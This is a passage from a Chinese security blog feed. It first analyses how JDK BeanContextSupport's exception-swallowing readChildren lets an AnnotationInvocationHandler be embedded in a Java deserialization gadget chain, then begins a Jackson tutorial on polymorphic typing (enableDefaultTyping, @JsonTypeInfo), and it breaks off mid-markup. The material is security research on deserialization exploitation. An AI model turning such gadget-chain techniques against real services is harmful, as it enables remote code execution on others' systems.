bcsPreDeserializationHook(ois);<br><br>        <span class="hljs-keyword">if</span> (serializable &amp;gt; <span class="hljs-number">0</span> &amp;amp;&amp;amp; <span class="hljs-built_in">this</span>.equals(getBeanContextPeer()))<br>            readChildren(ois);<span class="hljs-comment">//继续跟进readChilren</span><br><br>        deserialize(ois, bcmListeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(<span class="hljs-number">1</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">#BeanContextSupport#readChildren<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readChildren</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> serializable;<br><br>    <span class="hljs-keyword">while</span> (count-- &amp;gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">Object</span>                      <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        BeanContextSupport.<span class="hljs-type">BCSChild</span> <span class="hljs-variable">bscc</span>  <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            child = ois.readObject();<br>            bscc  = (BeanContextSupport.BCSChild)ois.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException ioe) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br><span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到在<code>readChildren</code>方法中,在执行<code>ois.readObject()</code>时,这里try catch了,但是没有把异常抛出来,程序会接着执行。如果这里可以把<code>AnnotationInvocationHandler</code>对象在<code>BeanContextSupport</code>类第二次<code>writeObject</code>的时候写入<code>AnnotationInvocationHandler</code>对象,这样反序列化时,即使<code>AnnotationInvocationHandler</code>对象 <code>this.type</code>的值为<code>Templates</code>类型也不会报错。</p><p>让<code>child = ois.readObject();</code>这一行读取AnnotationInvocationHandler，之后的catch并不影响反序列化流程，完美符合要求。</p><p>于是接下来的思路就很明确了：在最终LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。</p><p>先看看为了使<code>child = ois.readObject();</code>读取想要的AnnotationInvocationHandler需要做什么</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanContextSupport#writeObject<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    serializing = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">synchronized</span> (BeanContext.globalHierarchyLock) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            oos.defaultWriteObject(); <span class="hljs-comment">// serialize the BeanContextSupport object</span><br><br>            bcsPreSerializationHook(oos);<br><br>            <span class="hljs-keyword">if</span> (serializable &amp;gt; <span class="hljs-number">0</span> &amp;amp;&amp;amp; <span class="hljs-built_in">this</span>.equals(getBeanContextPeer()))<br>                writeChildren(oos);<br><br>            serialize(oos, (Collection)bcmListeners);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            serializing = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanContextSupport#writeChildren<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    serializing = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">synchronized</span> (BeanContext.globalHierarchyLock) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            oos.defaultWriteObject(); <span class="hljs-comment">// serialize the BeanContextSupport object</span><br><br>            bcsPreSerializationHook(oos);<br><br>            <span class="hljs-keyword">if</span> (serializable &amp;gt; <span class="hljs-number">0</span> &amp;amp;&amp;amp; <span class="hljs-built_in">this</span>.equals(getBeanContextPeer()))<br>                writeChildren(oos);<br><br>            serialize(oos, (Collection)bcmListeners);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            serializing = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanContextSupport.children<br> <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * all accesses to the &lt;code&gt; protected HashMap children &lt;/code&gt; field</span><br><span class="hljs-comment">     * shall be synchronized on that object.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">transient</span> HashMap         children;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JackSon使用及其反序列化</title>
    <link href="/decemberus.com/2023/02/01/JackSon%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/decemberus.com/2023/02/01/JackSon%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="JackSon使用及其反序列化"><a href="#JackSon使用及其反序列化" class="headerlink" title="JackSon使用及其反序列化"></a>JackSon使用及其反序列化</h1><p>Jackson 是用来序列化和反序列化 JSON 的 Java 的开源框架。Spring MVC 的默认 JSON 解析器便是 Jackson。与其他 Java 的 JSON 的框架 Gson 等相比， Jackson 解析大的 JSON 文件速度比较快；Jackson 运行时占用内存比较低，性能比较好；Jackson 有灵活的 API，可以很容易进行扩展和定制。</p><p>Jackson 的 1.x 版本的包名是 org.codehaus.jackson ，当升级到 2.x 版本时，包名变为 com.fasterxml.jackson，本文讨论的内容是基于最新的 Jackson 的 2.9.1 版本。</p><p>Jackson 的核心模块由三部分组成。</p><ul><li>jackson-core，核心包，提供基于“流模式”解析的相关 API，它包括 JsonPaser 和 JsonGenerator。Jackson 内部实现正是通过高性能的流模式 API 的 JsonGenerator 和 JsonParser 来生成和解析 JSON。</li><li>jackson-annotations，注解包，提供标准注解功能；</li><li>jackson-databind ，数据绑定包， 提供基于“对象绑定”解析的相关 API （ ObjectMapper ） 和“树模型”解析的相关 API （JsonNode）；基于“对象绑定”解析的 API 和“树模型”解析的 API 依赖基于“流模式”解析的 API。</li></ul><p>在了解 Jackson 的概要情况之后，下面介绍 Jackson 的基本用法。</p><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><p>若想在 Java 代码中使用 Jackson 的核心模块的 jar 包 ，需要在 pom.xml 中添加如下信息。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-databind<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>jackson-databind</code> 依赖 <code>jackson-core</code> 和 <code>jackson-annotations</code>，当添加 <code>jackson-databind</code> 之后， <code>jackson-core</code> 和 <code>jackson-annotations</code> 也随之添加到 Java 项目工程中。在添加相关依赖包之后，就可以使用 Jackson。</p><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><h3 id="通过对象"><a href="#通过对象" class="headerlink" title="通过对象"></a>通过对象</h3><p>Jackson 最常用的 API 就是基于“对象绑定”的 ObjectMapper。下面是一个 ObjectMapper 的使用的简单示例。</p><p>准备一个名称为 Person 的 Java 对象：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-comment">// 正常case</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> name;<br>    <span class="hljs-comment">// 空对象case</span><br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-comment">// 日期转换case</span><br>    <span class="hljs-keyword">private</span> Date date;<br>    <span class="hljs-comment">// 默认值case</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> height;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>    <span class="hljs-comment">// 造数据</span><br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>    person.setName(<span class="hljs-string">&quot;Tom&quot;</span>);<br>    person.setAge(<span class="hljs-number">40</span>);<br>    person.setDate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>    System.out.println(<span class="hljs-string">&quot;序列化&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> mapper.writerWithDefaultPrettyPrinter().writeValueAsString(person);<br>    System.out.println(jsonString);<br>    System.out.println(<span class="hljs-string">&quot;反序列化&quot;</span>);<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">deserializedPerson</span> <span class="hljs-operator">=</span> mapper.readValue(jsonString, Person.class);<br>    System.out.println(deserializedPerson);<br>&#125;<br></code></pre></td></tr></table></figure><p>打印输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">序列化<br>&#123;<br>  <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;Tom&quot;</span>,<br>  <span class="hljs-string">&quot;age&quot;</span> : 40,<br>  <span class="hljs-string">&quot;date&quot;</span> : 1594634846647,<br>  <span class="hljs-string">&quot;man&quot;</span> : <span class="hljs-literal">null</span>,<br>  <span class="hljs-string">&quot;height&quot;</span> : 0<br>&#125;<br>反序列化<br>JackSonTest.Person(<span class="hljs-attribute">name</span>=Tom, <span class="hljs-attribute">age</span>=40, <span class="hljs-attribute">date</span>=Mon Jul 13 18:07:26 CST 2020, <span class="hljs-attribute">man</span>=<span class="hljs-literal">null</span>, <span class="hljs-attribute">height</span>=0)<br></code></pre></td></tr></table></figure><p>ObjectMapper 通过 writeValue 系列方法将 java 对象序列化为 json，并将 json 存储成不同的格式，String（writeValueAsString），Byte Array（writeValueAsString），Writer， File，OutStream 和 DataOutput。</p><p>ObjectMapper 通过 readValue 系列方法从不同的数据源像 String ， Byte Array， Reader，File，URL， InputStream 将 json 反序列化为 java 对象。</p><h2 id="统一配置"><a href="#统一配置" class="headerlink" title="统一配置"></a>统一配置</h2><p>在调用 writeValue 或调用 readValue 方法之前，往往需要设置 ObjectMapper 的相关配置信息。这些配置信息应用 java 对象的所有属性上。示例如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>在反序列化时忽略在 json 中存在但 Java 对象不存在的属性<br>mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);<br><span class="hljs-regexp">//</span>在序列化时日期格式默认为 yyyy-MM-dd<span class="hljs-string">&#x27;T&#x27;</span>HH:mm:ss.SSSZ<br>mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);<br><span class="hljs-regexp">//</span>在序列化时自定义时间日期格式<br>mapper.setDateFormat(new SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>));<br><span class="hljs-regexp">//</span>在序列化时忽略值为 null 的属性<br>mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);<br><span class="hljs-regexp">//</span>在序列化时忽略值为默认值的属性<br>mapper.setDefaultPropertyInclusion(JsonInclude.Include.NON_DEFAULT);<br></code></pre></td></tr></table></figure><p>更多配置信息可以查看 Jackson 的 DeserializationFeature，SerializationFeature 和 Include。</p><p>重新运行单元测试1，打印输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">序列化<br>&#123;<br>  <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;Tom&quot;</span>,<br>  <span class="hljs-string">&quot;age&quot;</span> : 40,<br>  <span class="hljs-string">&quot;date&quot;</span> : <span class="hljs-string">&quot;2020-07-26 18:46:51&quot;</span><br>&#125;<br>反序列化<br>JackSonTest.Person(<span class="hljs-attribute">name</span>=Tom, <span class="hljs-attribute">age</span>=40, <span class="hljs-attribute">date</span>=Sun Jul 26 18:46:51 CST 2020, <span class="hljs-attribute">height</span>=0)<br></code></pre></td></tr></table></figure><h2 id="多态问题的解决"><a href="#多态问题的解决" class="headerlink" title="多态问题的解决"></a>多态问题的解决</h2><p>使用JacksonPolymorphicDeserialization</p><p>简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。</p><p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p><p>JacksonPolymorphicDeserialization即Jackson多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。</p><p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即DefaultTyping和@JsonTypeInfo注解。</p><p>下面具体介绍一下。</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jackson提供一个enableDefaultTyping设置，其包含4个值，查看jackson-databind-2.7.9.jar!&#x2F;com&#x2F;fasterxml&#x2F;jackson&#x2F;databind&#x2F;ObjectMapper.java可看到相关介绍信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DefaultTyping</span> &#123;<br>       <span class="hljs-comment">/**</span><br><span class="hljs-comment">        * This value means that only properties that have</span><br><span class="hljs-comment">        * &#123;<span class="hljs-doctag">@link</span> java.lang.Object&#125; as declared type (including</span><br><span class="hljs-comment">        * generic types without explicit type) will use default</span><br><span class="hljs-comment">        * typing.</span><br><span class="hljs-comment">        */</span><br>       JAVA_LANG_OBJECT,<br>       <br>       <span class="hljs-comment">/**</span><br><span class="hljs-comment">        * Value that means that default typing will be used for</span><br><span class="hljs-comment">        * properties with declared type of &#123;<span class="hljs-doctag">@link</span> java.lang.Object&#125;</span><br><span class="hljs-comment">        * or an abstract type (abstract class or interface).</span><br><span class="hljs-comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.</span><br><span class="hljs-comment">        *&lt;p&gt;</span><br><span class="hljs-comment">        * Since 2.4, this does NOT apply to &#123;<span class="hljs-doctag">@link</span> TreeNode&#125; and its subtypes.</span><br><span class="hljs-comment">        */</span><br>       OBJECT_AND_NON_CONCRETE,<br><br>       <span class="hljs-comment">/**</span><br><span class="hljs-comment">        * Value that means that default typing will be used for</span><br><span class="hljs-comment">        * all types covered by &#123;<span class="hljs-doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;</span><br><span class="hljs-comment">        * plus all array types for them.</span><br><span class="hljs-comment">        *&lt;p&gt;</span><br><span class="hljs-comment">        * Since 2.4, this does NOT apply to &#123;<span class="hljs-doctag">@link</span> TreeNode&#125; and its subtypes.</span><br><span class="hljs-comment">        */</span><br>       NON_CONCRETE_AND_ARRAYS,<br>       <br>       <span class="hljs-comment">/**</span><br><span class="hljs-comment">        * Value that means that default typing will be used for</span><br><span class="hljs-comment">        * all non-final types, with exception of small number of</span><br><span class="hljs-comment">        * &quot;natural&quot; types (String, Boolean, Integer, Double), which</span><br><span class="hljs-comment">        * can be correctly inferred from JSON; as well as for</span><br><span class="hljs-comment">        * all arrays of non-final types.</span><br><span class="hljs-comment">        *&lt;p&gt;</span><br><span class="hljs-comment">        * Since 2.4, this does NOT apply to &#123;<span class="hljs-doctag">@link</span> TreeNode&#125; and its subtypes.</span><br><span class="hljs-comment">        */</span><br>       NON_FINAL<br>   &#125;<br></code></pre></td></tr></table></figure><p><strong>默认情况下，即无参数的enableDefaultTyping是第二个设置，OBJECT_AND_NON_CONCRETE。</strong></p><p>下面分别对这几个选项进行说明。</p><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个Object类型时，会对该Object类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化的类）</p><p>添加一个Hacker类</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> skill = <span class="hljs-string">&quot;Jackson&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Perosn类修改如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> developtry;<br><br><span class="hljs-keyword">import</span> lombok.Data;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-comment">// 正常case</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">// 空对象case</span><br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-comment">// 日期转换case</span><br>    <span class="hljs-keyword">private</span> Date date;<br>    <span class="hljs-comment">// 默认值case</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> height;<br><br>    <span class="hljs-keyword">private</span> Object object;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>添加enableDefaultTyping()并设置为JAVA_LANG_OBJECT：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> developtry.Hacker;<br><span class="hljs-keyword">import</span> developtry.Person;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test3</span> &#123;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Person p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p.setName(<span class="hljs-string">&quot;enjoy&quot;</span>);<br>        p.setDate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>        p.setAge(<span class="hljs-number">18</span>);<br>        p.setObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>());<br>        ObjectMapper mapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><br>        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);<br>        String json=mapper.writeValueAsString(p);<br>        System.out.println(json);<br><br>        Person person2=mapper.readValue(json,Person.class);<br>        System.out.println(person2);<br>    &#125;<br>&#125;<br><br>输出为<br><br><span class="hljs-comment">//&#123;&quot;name&quot;:&quot;enjoy&quot;,&quot;age&quot;:18,&quot;date&quot;:1684321235607,&quot;height&quot;:0,&quot;object&quot;:[&quot;developtry.Hacker&quot;,&#123;&quot;skill&quot;:&quot;Jackson&quot;&#125;]&#125;</span><br><span class="hljs-comment">//Person(name=enjoy, age=18, date=Wed May 17 19:00:35 CST 2023, height=0, object=developtry.Hacker@22eeefeb)</span><br>    <br>注释掉mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);输出为<br><br><span class="hljs-comment">//&#123;&quot;name&quot;:&quot;enjoy&quot;,&quot;age&quot;:18,&quot;date&quot;:1684321775849,&quot;height&quot;:0,&quot;object&quot;:&#123;&quot;skill&quot;:&quot;Jackson&quot;&#125;&#125;</span><br><span class="hljs-comment">//Person(name=enjoy, age=18, date=Wed May 17 19:09:35 CST 2023, height=0, object=&#123;skill=Jackson&#125;)</span><br><br></code></pre></td></tr></table></figure><p>输出对比看到，通过enableDefaultTyping()设置设置JAVA_LANG_OBJECT后，会多输出Hacker类名，且在输出的Object属性时直接输出的是Hacker类对象，也就是说同时对Object属性对象进行了序列化和反序列化操作：</p><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></p><p>输出，可以看到该Interface类属性被成功序列化和反序列化：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;<span class="hljs-string">&quot;age&quot;</span>:6,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;mi1k7ea&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:[<span class="hljs-string">&quot;developtry.Hacker&quot;</span>,&#123;<span class="hljs-string">&quot;skill&quot;</span>:<span class="hljs-string">&quot;Jackson&quot;</span>&#125;],<span class="hljs-string">&quot;sex&quot;</span>:&#123;<span class="hljs-string">&quot;sex&quot;</span>:0&#125;&#125;<br>Person.<span class="hljs-attribute">age</span>=6, Person.<span class="hljs-attribute">name</span>=mi1k7ea, developtry.Hacker@578486a3, developtry2.Sex@551aa95a<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">DefaultTyping类型</th><th align="left">描述说明</th></tr></thead><tbody><tr><td align="left">JAVA_LANG_OBJECT</td><td align="left">属性的类型为Object</td></tr><tr><td align="left">OBJECT_AND_NON_CONCRETE</td><td align="left">属性的类型为Object、Interface、AbstractClass</td></tr><tr><td align="left">NON_CONCRETE_AND_ARRAYS</td><td align="left">属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td align="left">NON_FINAL</td><td align="left">所有除了声明为final之外的属性</td></tr></tbody></table><h3 id="JsonTypeInfo注解"><a href="#JsonTypeInfo注解" class="headerlink" title="@JsonTypeInfo注解"></a>@JsonTypeInfo注解</h3><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span 